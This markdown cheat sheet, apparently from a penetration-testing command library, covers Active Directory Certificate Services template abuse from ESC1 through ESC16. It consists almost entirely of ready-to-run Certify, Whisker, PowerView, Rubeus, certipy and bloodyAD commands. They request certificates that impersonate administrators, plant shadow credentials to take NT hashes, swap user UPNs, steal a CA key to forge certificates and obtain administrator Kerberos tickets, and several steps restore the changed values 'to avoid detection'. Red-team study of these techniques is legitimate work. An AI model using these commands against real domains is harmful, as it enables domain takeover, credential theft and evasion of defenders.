---
technique: Certificate Template Abuse
category: adcs
targets: Domain User, Domain Admin
protocols: LDAP, Kerberos, HTTPS
remote_capable: true
tags: adcs esc certificate-templates privesc kerberos pkinit
---

# Certificate Template Abuse

Misconfigured certificate templates in AD CS allow low-privileged users to request certificates that can be used to authenticate as other principals, including Domain Admins. Each ESC (Escalation) vector corresponds to a specific misconfiguration class.

## Windows

Windows tooling uses Certify (C#) for enumeration and requests, Whisker for shadow credentials, PowerView for attribute manipulation, and Rubeus for PKINIT authentication.

### ESC1: Certify (enumerate)

#powershell #certify #san #enum

Enumerate vulnerable templates with Certify to find templates that allow enrollee-supplied SANs.

```powershell title:"ESC1: enumerate vulnerable templates with Certify"
.\Certify.exe find /vulnerable
```
<!-- cheat
import domain_ip
import users
-->

### ESC1: Certify (request)

#powershell #certify #san

Request a cert with an arbitrary SAN to impersonate a privileged user.

```powershell title:"ESC1: request cert with admin SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"$target_user"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
var target_user
-->

### ESC2: Certify (enumerate)

#powershell #certify #any-purpose #enum

Enumerate templates with Any Purpose EKU to identify ESC2-vulnerable templates.

```powershell title:"ESC2: find any-purpose templates with Certify"
.\Certify.exe find /vulnerable
```
<!-- cheat
import domain_ip
import users
-->

### ESC2: Certify (request)

#powershell #certify #any-purpose

Request a cert from an Any Purpose EKU template; if SAN is not enrollee-supplied, pivot to ESC3 flow using the issued cert as an enrollment agent.

```powershell title:"ESC2: request from any-purpose template with Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC3: Step 1: request enrollment agent cert (Certify)

#powershell #certify #enrollment-agent

Request an Enrollment Agent cert from the vulnerable template.

```powershell title:"ESC3: request enrollment agent cert from vulnerable template"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC3: Step 2: enroll on behalf of admin (Certify)

#powershell #certify #enrollment-agent

Use the enrollment agent cert to enroll on behalf of a privileged user.

```powershell title:"ESC3: enroll on behalf of admin using agent cert"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User" /onbehalfon:"$domain\$target_user" /enrollcert:"$agent_pfx" /enrollcertpw:"$pfx_pass"
```
<!-- cheat
import domain_ip
import users
var ca_name
var target_user
var agent_pfx
var pfx_pass
-->

### ESC4: Step 1: enable enrollee-supplied SAN (PowerView)

#powershell #powerview #template-write

Enable the enrollee-supplied SAN flag on the template via PowerView.

```powershell title:"ESC4: XOR mspki-enrollment-flag to enable enrollee-supplied SAN"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -XOR @{'mspki-enrollment-flag'=2} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### ESC4: Step 2: clear RA signature requirement (PowerView)

#powershell #powerview #template-write

Clear the RA signature requirement on the template so no enrollment agent approval is needed.

```powershell title:"ESC4: set mspki-ra-signature to 0"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -Set @{'mspki-ra-signature'=0} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### ESC4: Step 3: enable subject name flag (PowerView)

#powershell #powerview #template-write

Enable the certificate name flag that allows the requester to supply an arbitrary subject name.

```powershell title:"ESC4: XOR mspki-certificate-name-flag to allow arbitrary subject"
Set-DomainObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=contoso,DC=local" -Identity "$template_name" -XOR @{'mspki-certificate-name-flag'=1} -Verbose
```
<!-- cheat
import domain_ip
import users
var template_name
-->

### ESC4: Step 4: request cert with admin SAN (Certify)

#powershell #certify #san

Request a cert with administrator in the SAN against the now-vulnerable template.

```powershell title:"ESC4: request cert with administrator SAN via Certify"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name" /altname:"administrator"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC9: Step 1: add shadow credentials (Whisker)

#powershell #whisker #shadow-credentials

Add shadow credentials to the victim account to get their NT hash for subsequent steps.

```powershell title:"ESC9: add shadow credentials to victim via Whisker"
.\Whisker.exe add /target:"$victim_user" /domain:"$domain" /dc:"$dc_name" /path:"shadow.pfx" /password:"$pfx_pass"
```
<!-- cheat
import domain_ip
import users
var victim_user
var dc_name
var pfx_pass
-->

### ESC9: Step 2: rewrite victim UPN to target (PowerView)

#powershell #powerview #no-sid-extension #upn-swap

Rewrite the victim's UPN to match the target user so the issued cert maps to the target principal.

```powershell title:"ESC9: set victim UPN to target user"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$target_user'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
var target_user
-->

### ESC9: Step 3: request cert as victim (Certify)

#powershell #certify #no-sid-extension

Request a cert from the no-security-extension template while the victim's UPN maps to the target.

```powershell title:"ESC9: request cert as victim on no-security-extension template"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC9: Step 4: restore victim UPN (PowerView)

#powershell #powerview #no-sid-extension #upn-swap

Restore the victim's original UPN to avoid detection.

```powershell title:"ESC9: restore victim UPN to original value"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$victim_user@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC9: Step 5: PKINIT as target (Rubeus)

#powershell #rubeus #pkinit

Authenticate with PKINIT using the issued cert to obtain the target's TGT and NT hash.

```powershell title:"ESC9: PKINIT with issued cert to get target TGT and hash"
.\Rubeus.exe asktgt /getcredentials /certificate:"$cert_b64" /password:"$pfx_pass" /domain:"$domain" /dc:"$dc_name" /show
```
<!-- cheat
import domain_ip
import users
var dc_name
var pfx_pass
var cert_b64
-->

### ESC10: Step 1: add shadow credentials to victim (Whisker)

#powershell #whisker #shadow-credentials

Add shadow credentials to the victim account to authenticate as them later.

```powershell title:"ESC10: add shadow credentials to victim via Whisker"
.\Whisker.exe add /target:"$victim_user" /domain:"$domain" /dc:"$dc_name" /path:"shadow.pfx" /password:"$pfx_pass"
```
<!-- cheat
import domain_ip
import users
var victim_user
var dc_name
var pfx_pass
-->

### ESC10: Step 2: rewrite victim UPN to DC machine account (PowerView)

#powershell #powerview #weak-mapping #upn-swap

Rewrite the victim's UPN to the DC machine account UPN to abuse weak certificate binding enforcement.

```powershell title:"ESC10: set victim UPN to DC machine account"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$dc_name$@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
var dc_name
-->

### ESC10: Step 3: request User cert as victim (Certify)

#powershell #certify #weak-mapping #schannel

Request a cert from the User template while the victim's UPN maps to the DC machine account.

```powershell title:"ESC10: request User cert while victim UPN is DC machine account"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"User"
```
<!-- cheat
import domain_ip
import users
var ca_name
-->

### ESC10: Step 4: restore victim UPN (PowerView)

#powershell #powerview #weak-mapping

Restore the victim's original UPN.

```powershell title:"ESC10: restore victim UPN to original value"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$victim_user@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC13: Step 1: verify OID group link (AD module)

#powershell #rsat #issuance-policy #group-link

Verify that the template's issuance policy has an OID group link to a privileged group.

```powershell title:"ESC13: check msPKI-Certificate-Policy on template"
Get-ADObject "CN=$template_name,$template_container" -Properties msPKI-Certificate-Policy
```
<!-- cheat
import domain_ip
import users
var template_name
var template_container
-->

### ESC13: Step 2: confirm msDS-OIDToGroupLink (AD module)

#powershell #rsat #issuance-policy #group-link

Confirm the OID policy object has a group link that grants elevated privileges on enrollment.

```powershell title:"ESC13: check msDS-OIDToGroupLink on policy OID object"
Get-ADObject "CN=$policy_id,$oid_container" -Properties DisplayName,msPKI-Cert-Template-OID,msDS-OIDToGroupLink
```
<!-- cheat
import domain_ip
import users
var policy_id
var oid_container
-->

### ESC13: Step 3: enroll on policy-linked template (Certify)

#powershell #certify #issuance-policy #group-link

Enroll on the template; the issued cert grants the linked group's privileges during PKINIT.

```powershell title:"ESC13: enroll on OID-group-linked template for elevated token"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC14: Add explicit certificate mapping (PowerShell)

#powershell #altsecurityidentities #explicit-mapping

Write an explicit certificate mapping string to the target object's `altSecurityIdentities` attribute.

```powershell title:"ESC14: add explicit altSecurityIdentities mapping"
Add-AltSecIDMapping -DistinguishedName "$target_dn" -MappingString "$x509_claim"
```
<!-- cheat
var target_dn
var x509_claim
-->

### ESC14: Remove explicit certificate mapping (PowerShell)

#powershell #altsecurityidentities #cleanup

Remove the explicit mapping string after certificate authentication testing.

```powershell title:"ESC14: remove explicit altSecurityIdentities mapping"
Remove-AltSecIDMapping -DistinguishedName "$target_dn" -MappingString "$x509_claim"
```
<!-- cheat
var target_dn
var x509_claim
-->

### ESC15: Certify (enumerate)

#powershell #certify #application-policy #schema-v1

ESC15 targets schema version 1 templates; no Windows tool supports arbitrary application policy injection at the time of writing, use Linux.

```powershell title:"ESC15: enumerate schema v1 templates (exploitation requires Linux)"
.\Certify.exe find /vulnerable
```
<!-- cheat
import domain_ip
import users
-->

### ESC16: Step 1: rewrite victim UPN to administrator (PowerView)

#powershell #powerview #no-sid-extension #ca-wide #upn-swap

Rewrite victim UPN to administrator to abuse the CA-wide security SID extension disable.

```powershell title:"ESC16: set victim UPN to administrator"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='administrator'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC16: Step 2: request cert as victim (Certify)

#powershell #certify #no-sid-extension #ca-wide

Request a cert from any auth template while the victim's UPN maps to administrator.

```powershell title:"ESC16: request cert while victim UPN is administrator"
.\Certify.exe request /ca:"$domain\$ca_name" /template:"$template_name"
```
<!-- cheat
import domain_ip
import users
var ca_name
var template_name
-->

### ESC16: Step 3: restore victim UPN (PowerView)

#powershell #powerview #no-sid-extension #ca-wide

Restore the victim's original UPN.

```powershell title:"ESC16: restore victim UPN"
Set-DomainObject "$victim_user" -Set @{'userPrincipalName'='$victim_user@$domain'} -Verbose
```
<!-- cheat
import domain_ip
import users
var victim_user
-->

### ESC16: Step 4: PKINIT as administrator (Rubeus)

#powershell #rubeus #pkinit

Authenticate with PKINIT using the issued cert to obtain the administrator TGT and NT hash.

```powershell title:"ESC16: PKINIT with issued cert to get administrator TGT"
.\Rubeus.exe asktgt /getcredentials /certificate:"$cert_b64" /password:"$pfx_pass" /domain:"$domain" /dc:"$dc_name" /show
```
<!-- cheat
import domain_ip
import users
var cert_b64
var pfx_pass
var dc_name
-->

## Linux

All Linux tooling uses certipy as the primary client. The `import certipy_auth` block handles password, hash, and Kerberos auth selection.

### ESC1: Step 1: request cert with admin SAN (certipy)

#certipy #san #pkinit

Request a cert with an arbitrary UPN in the SAN from a template that allows enrollee-supplied subject.

```sh title:"ESC1: request cert with admin SAN via certipy"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC1: Step 2: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the cert to get the admin TGT and NT hash.

```sh title:"ESC1: PKINIT with admin cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### ESC2: Step 1: enumerate any-purpose templates (certipy)

#certipy #any-purpose #enum

Enumerate templates with Any Purpose EKU or no EKU.

```sh title:"ESC2: find any-purpose / no-EKU templates"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### ESC2: Step 2: request from any-purpose template (certipy)

#certipy #any-purpose

Request a cert from the any-purpose or no-EKU template; if SAN is not available, continue to ESC3 flow.

```sh title:"ESC2: request from any-purpose template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC3: Step 1: request enrollment agent cert (certipy)

#certipy #enrollment-agent

Request an Enrollment Agent cert from the vulnerable template.

```sh title:"ESC3: request enrollment agent cert"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC3: Step 2: enroll on behalf of administrator (certipy)

#certipy #enrollment-agent

Use the enrollment agent cert to enroll on behalf of administrator.

```sh title:"ESC3: enroll on-behalf-of administrator using agent cert"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -on-behalf-of "$domain\\administrator" -pfx $agent_pfx
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var agent_pfx
-->

### ESC3: Step 3: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the administrator TGT and NT hash.

```sh title:"ESC3: PKINIT with administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### ESC4: Step 1: save old template config (certipy)

#certipy #template-write

Save the original template configuration before making changes.

```sh title:"ESC4: save original template config"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -save-old
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### ESC4: Step 2: request cert with admin UPN (certipy)

#certipy #template-write #san

Request a cert with the admin UPN against the now-vulnerable template config.

```sh title:"ESC4: request cert with admin UPN against modified template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC4: Step 3: restore original template config (certipy)

#certipy #template-write

Restore the original template configuration to avoid detection.

```sh title:"ESC4: restore original template config from saved JSON"
certipy template -u $user@$domain $auth_flags -dc-ip $rhost_ip -template $template_name -configuration $template_name.json
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var template_name
-->

### ESC5: Step 1: backup CA key after PKI object takeover (certipy)

#certipy #object-acl #ca-backup

Abuse ACL misconfigurations on PKI objects to gain CA control, then back up the private key.

```sh title:"ESC5: backup CA key after gaining PKI object control"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -backup
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC5: Step 2: forge golden certificate (certipy)

#certipy #forge #san #offline

Forge a certificate offline using the stolen CA PFX to impersonate administrator.

```sh title:"ESC5: forge cert with stolen CA key"
certipy forge -ca-pfx $ca_pfx -upn administrator@$domain -subject "$target_subject" -out administrator.pfx
```
<!-- cheat
import domain_ip
var ca_pfx
var target_subject
-->

### ESC5: Step 3: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the forged cert to get the administrator TGT and NT hash.

```sh title:"ESC5: PKINIT with forged administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### ESC6: Step 1: request cert with arbitrary SAN (certipy)

#certipy #editf-san #ca-flag

With EDITF_ATTRIBUTESUBJECTALTNAME2 set on the CA, request any auth template with an arbitrary UPN in the SAN.

```sh title:"ESC6: arbitrary SAN via EDITF_ATTRIBUTESUBJECTALTNAME2"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC6: Step 2: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the cert with the arbitrary SAN.

```sh title:"ESC6: PKINIT with arbitrary SAN cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### ESC7: Step 1: add self as CA officer (certipy)

#certipy #manage-ca #subca

Grant self ManageCertificates (officer) role on the CA.

```sh title:"ESC7: add self as officer on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -add-officer $user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC7: Step 2: enable SubCA template (certipy)

#certipy #manage-ca #subca

Enable the SubCA template so a request with admin UPN can be submitted.

```sh title:"ESC7: enable SubCA template on the CA"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -enable-template SubCA
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC7: Step 3: submit pending request (certipy)

#certipy #manage-ca #subca

Submit a cert request with admin UPN against SubCA; it will pend or fail and return a request ID.

```sh title:"ESC7: submit SubCA request with admin UPN (will pend)"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template SubCA -upn administrator@$domain
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC7: Step 4: approve pending request (certipy)

#certipy #manage-certificates #subca

Approve the pending request as CA officer to issue the certificate.

```sh title:"ESC7: approve own pending request as CA officer"
certipy ca -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -issue-request $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### ESC7: Step 5: retrieve issued cert (certipy)

#certipy #manage-ca #subca

Retrieve the now-issued certificate using the request ID.

```sh title:"ESC7: retrieve issued cert by request ID"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -retrieve $request_id
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var request_id
-->

### ESC7: Step 6: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the retrieved cert to get the administrator TGT and NT hash.

```sh title:"ESC7: PKINIT with retrieved administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### ESC9: Step 1: obtain victim NT hash via shadow credentials (certipy)

#certipy #shadow-credentials #no-sid-extension

Get the victim's NT hash via shadow credentials so they can be impersonated during cert request.

```sh title:"ESC9: shadow auto to get victim NT hash"
certipy shadow auto -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim_user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC9: Step 2: rewrite victim UPN to target (certipy)

#certipy #no-sid-extension #upn-swap

Rewrite the victim's UPN to the target user so the issued cert maps to the target principal.

```sh title:"ESC9: update victim UPN to target user"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $target_user -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
var target_user
-->

### ESC9: Step 3: request cert as victim (certipy)

#certipy #no-sid-extension

Request a cert using victim's Kerberos ticket while their UPN maps to the target user.

```sh title:"ESC9: request cert as victim using Kerberos ticket"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
var template_name
-->

### ESC9: Step 4: restore victim UPN (certipy)

#certipy #no-sid-extension #upn-swap

Restore the victim's original UPN.

```sh title:"ESC9: restore victim UPN to original value"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim_user@$domain -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC9: Step 5: PKINIT as target (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the target's TGT and NT hash.

```sh title:"ESC9: PKINIT as target user with issued cert"
certipy auth -pfx $target_user.pfx -domain $domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
var target_user
-->

### ESC10: Step 1: obtain victim NT hash via shadow credentials (certipy)

#certipy #shadow-credentials #weak-mapping

Get the victim's NT hash via shadow credentials.

```sh title:"ESC10: shadow auto to get victim NT hash"
certipy shadow auto -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim_user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC10: Step 2: rewrite victim UPN to DC machine account (certipy)

#certipy #weak-mapping #upn-swap

Rewrite the victim's UPN to the DC machine account UPN.

```sh title:"ESC10: update victim UPN to DC machine account"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn "$dc_name\$@$domain" -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
var dc_name
-->

### ESC10: Step 3: request User cert as victim (certipy)

#certipy #weak-mapping #schannel

Request a User template cert using the victim's Kerberos ticket while UPN maps to the DC.

```sh title:"ESC10: request User cert while victim UPN is DC machine account"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
-->

### ESC10: Step 4: restore victim UPN (certipy)

#certipy #weak-mapping #upn-swap

Restore the victim's original UPN.

```sh title:"ESC10: restore victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim_user@$domain -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC10: Step 5: authenticate via Schannel LDAP shell (certipy)

#certipy #schannel #ldap-shell

Authenticate using the DC cert via Schannel to get an LDAP shell for RBCD or DCSync.

```sh title:"ESC10: Schannel auth with DC cert for LDAP shell"
certipy auth -pfx $dc_name.pfx -dc-ip $rhost_ip -ldap-shell
```
<!-- cheat
import domain_ip
import certipy_auth
var dc_name
-->

### ESC13: Step 1: enumerate vulnerable templates (certipy)

#certipy #issuance-policy #group-link #enum

Enumerate templates to find those with OID group links to privileged groups.

```sh title:"ESC13: find vulnerable templates with certipy"
certipy find -u $user@$domain $auth_flags -dc-ip $rhost_ip -vulnerable -enabled -text
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### ESC13: Step 2: enroll on policy-linked template (certipy)

#certipy #issuance-policy #group-link

Enroll on the template whose issuance policy is linked to a privileged group.

```sh title:"ESC13: request cert from OID-group-linked template"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC13: Step 3: PKINIT for elevated group token (certipy)

#certipy #pkinit

Authenticate with PKINIT; the resulting TGT carries the linked privileged group's membership.

```sh title:"ESC13: PKINIT with policy-linked cert for elevated token"
certipy auth -pfx $user.pfx -username $user@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import users
import certipy_auth
-->

### ESC14: Step 1: request certificate for controlled principal (certipy)

#certipy #altsecurityidentities #explicit-mapping

Request a certificate for the controlled principal before writing an explicit mapping on the target.

```sh title:"ESC14: request cert for explicit mapping abuse"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC14: Step 2: export certificate without key (certipy)

#certipy #altsecurityidentities #explicit-mapping

Export the certificate portion from the issued PFX so issuer and serial values can be inspected.

```sh title:"ESC14: export certificate from PFX"
certipy cert -pfx "$pfx_file" -nokey -out "$cert_file"
```
<!-- cheat
var pfx_file
var cert_file
-->

### ESC14: Step 3: inspect certificate issuer and serial (openssl)

#openssl #altsecurityidentities #explicit-mapping

Inspect the issued certificate to build the explicit mapping claim.

```sh title:"ESC14: inspect certificate issuer and serial"
openssl x509 -in "$cert_file" -noout -text
```
<!-- cheat
var cert_file
-->

### ESC14: Step 4: write explicit mapping (bloodyAD)

#bloodyad #altsecurityidentities #explicit-mapping

Write the crafted X509 mapping claim to the target account.

```sh title:"ESC14: write altSecurityIdentities mapping with bloodyAD"
bloodyAD --host $rhost_name -d $domain -u $user $auth_flags set object $target_user altSecurityIdentities -v "$x509_claim"
```
<!-- cheat
import domain_ip
import users
import bloody_auth
var rhost_name
var target_user
var x509_claim
-->

### ESC14: Step 5: authenticate with mapped certificate (certipy)

#certipy #pkinit #explicit-mapping

Authenticate as the mapped target with the issued certificate.

```sh title:"ESC14: PKINIT with explicitly mapped cert"
certipy auth -pfx "$pfx_file" -username $target_user@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
var pfx_file
var target_user
-->

### ESC15: Step 1: inject Certificate Request Agent policy (certipy)

#certipy #application-policy #schema-v1 #cve-2024-49019

Inject the Certificate Request Agent application policy OID into a schema v1 template request to get an enrollment agent cert.

```sh title:"ESC15: request with injected enrollment agent app policy"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template $template_name -application-policies "1.3.6.1.4.1.311.20.2.1"
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
var template_name
-->

### ESC15: Step 2: enroll on behalf of administrator (certipy)

#certipy #application-policy #schema-v1

Use the enrollment agent cert issued via ESC15 to enroll on behalf of administrator.

```sh title:"ESC15: enroll on-behalf-of administrator using ESC15 agent cert"
certipy req -u $user@$domain $auth_flags -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User -on-behalf-of "$domain\\administrator" -pfx $user.pfx
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var ca_fqdn
var ca_name
-->

### ESC15: Step 3: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued administrator cert.

```sh title:"ESC15: PKINIT with administrator cert from ESC15 chain"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->

### ESC16: Step 1: obtain victim NT hash via shadow credentials (certipy)

#certipy #shadow-credentials #no-sid-extension #ca-wide

Get the victim's NT hash via shadow credentials for subsequent impersonation.

```sh title:"ESC16: shadow auto to get victim NT hash"
certipy shadow auto -u $user@$domain $auth_flags -dc-ip $rhost_ip -account $victim_user
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC16: Step 2: rewrite victim UPN to administrator (certipy)

#certipy #no-sid-extension #ca-wide #upn-swap

Rewrite the victim's UPN to administrator to abuse the CA-wide security extension disable.

```sh title:"ESC16: update victim UPN to administrator"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn administrator -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC16: Step 3: request cert as victim (certipy)

#certipy #no-sid-extension #ca-wide

Request a cert using the victim's Kerberos ticket while their UPN is administrator.

```sh title:"ESC16: request User cert while victim UPN is administrator"
certipy req -k -dc-ip $rhost_ip -target $ca_fqdn -ca $ca_name -template User
```
<!-- cheat
import domain_ip
var ca_fqdn
var ca_name
-->

### ESC16: Step 4: restore victim UPN (certipy)

#certipy #no-sid-extension #ca-wide #upn-swap

Restore the victim's original UPN.

```sh title:"ESC16: restore victim UPN"
certipy account -u $user@$domain $auth_flags -dc-ip $rhost_ip -upn $victim_user@$domain -user $victim_user update
```
<!-- cheat
import domain_ip
import users
import certipy_auth
var victim_user
-->

### ESC16: Step 5: PKINIT as administrator (certipy)

#certipy #pkinit

Authenticate with PKINIT using the issued cert to get the administrator TGT and NT hash.

```sh title:"ESC16: PKINIT with administrator cert"
certipy auth -pfx administrator.pfx -username administrator@$domain -dc-ip $rhost_ip
```
<!-- cheat
import domain_ip
import certipy_auth
-->
